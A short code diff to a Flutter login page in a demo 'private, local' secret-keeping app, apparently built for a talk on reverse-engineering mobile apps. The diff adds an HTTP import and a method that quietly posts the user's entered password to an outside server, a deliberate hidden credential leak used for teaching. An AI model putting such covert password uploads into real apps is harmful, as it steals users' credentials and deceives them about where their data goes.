@@ -1,5 +1,6 @@
 import 'package:demo_app/SecretKeeper.dart';
 import 'package:flutter/material.dart';
+import 'package:http/http.dart' as http;
 
 var intro = """
 Welcome to your very own, very private, very local secret treasure app.
@@ -15,8 +16,11 @@ class LoginPage extends StatefulWidget {
 
 class _LoginPageState extends State<LoginPage> {
 
-  void _sneakilyUploadPasswordToOwnServer(String password) {
-
+  Future<void> _sneakilyUploadPasswordToOwnServer(String password) async {
+    await http.post(
+      "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakyPasswordCollection",
+      body: password
+    );
   }
 
   void _handleSubmitted(String password) {
